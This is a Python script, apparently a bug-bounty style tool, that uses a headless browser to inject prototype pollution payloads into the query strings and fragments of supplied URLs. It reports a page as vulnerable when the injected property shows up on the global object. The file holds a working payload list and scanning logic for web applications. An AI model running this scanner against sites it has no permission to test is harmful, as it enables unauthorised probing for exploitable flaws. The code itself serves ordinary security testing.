import asyncio
from asyncio.locks import Lock
from urllib import parse
from pyppeteer import launch
import pyppeteer
from colorama import *
import sys
import string
import random
from urllib import parse
import argparse

init() 
GREEN   = Fore.GREEN
RED     = Fore.RED
RESET   = Fore.RESET
BLUE    = Fore.BLUE
YELLOW  = Fore.YELLOW
MAGENTA  = Fore.MAGENTA

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" # Why not

payloads = [
    "__proto__[property]=value",
    "__proto__.property.=value",
    "constructor.prototype.property=value",
    "constructor[prototype][property]=value",
    "constructor[prototype].property=value",
    "constructor.prototype.[property]=value",
    "{\"__proto__\": {\"property\": \"value\"}}",
]



def rand_str(n):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(n))


def has_param(url):
    parsed_url = parse.urlparse(url)
    return parsed_url.query != ""

def qs_replace(url, val):
    root, query = url.split('?')
    qs_dict = {}
    for pair in query.split('&'):
        pair = pair.split("=")
        qs_dict[pair[0]] = "placeholder"
    qs = ""
    for k,v in qs_dict.items():
        qs += k + "="+ val 
        qs += "&"
    return root + "?" + qs[:-1]



async def close_dialog(dialog):
    sys.stdout.write(f"{MAGENTA}[!] A dialog received: \"{dialog.message}\" {RESET}\n")
    await dialog.dismiss()
    

async def do_req(page, url, payload):
    prop = rand_str(10)
    val = rand_str(10)

    payload = payload.replace("property",prop)
    payload = payload.replace("value",val)

    if has_param(url) and ("*" in url):
        url = url.replace("*",payload)
    elif has_param(url):
        url = qs_replace(url,payload)
        url = url + "&" + payload
    else:
        url += payload

    try:
        await page.goto(url)
        pollution = await page.evaluate(prop)
        if pollution == val:
            sys.stdout.write(f"{GREEN}[*] Vulnerable, {url} \n{RESET}")    

    except pyppeteer.errors.ElementHandleError:
        sys.stdout.write(f"{RED}[!] Not vulnerable, {url} \n{RESET}")    
    except:
        sys.stdout.write(f"{RED}[!] Something went wrong when performing, {url} \n{RESET}")    



async def main(urls,c):
    tasks = []
    browser = await launch({
        "ignoreHTTPSErrors": True,
        "args": ["--ignore-certificate-errors"],
        "headless" : True
}
)
    page = await browser.newPage()
    page.on('dialog', lambda dialog: asyncio.ensure_future(close_dialog(dialog)))
    await page.setUserAgent(user_agent); # not needed but why not
    for url in urls:
        for payload in payloads:
            if has_param(url):
                await do_req(page,url,payload)
            else:
                # it looks ugly but idc
                for i in ["?","#"]:
                    await do_req(page,url+i,payload)
    
    await browser.close()




if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--list", dest="list",help="List of urls")
    parser.add_argument("-u", "--url", dest="url",help="Single url")
    parser.add_argument("-c", "--concurrency", dest="concurrency",type=int,help="Concurrency", default=20)

    
    args = parser.parse_args()
    if (len(sys.argv) < 2) and (sys.stdin.isatty() == True):
        parser.print_usage()
        sys.exit(0)
    
    c = args.concurrency

    urls = []
    if args.url:
        # single url is supplied
        urls.append(args.url)
    else:
        if sys.stdin.isatty():
            f = open(args.list,"r")
            for url in f:
                urls.append(url.replace("\n",""))
        else:
            for url in sys.stdin:
                urls.append(url.replace("\n",""))
            
    asyncio.get_event_loop().run_until_complete(main(urls,c))

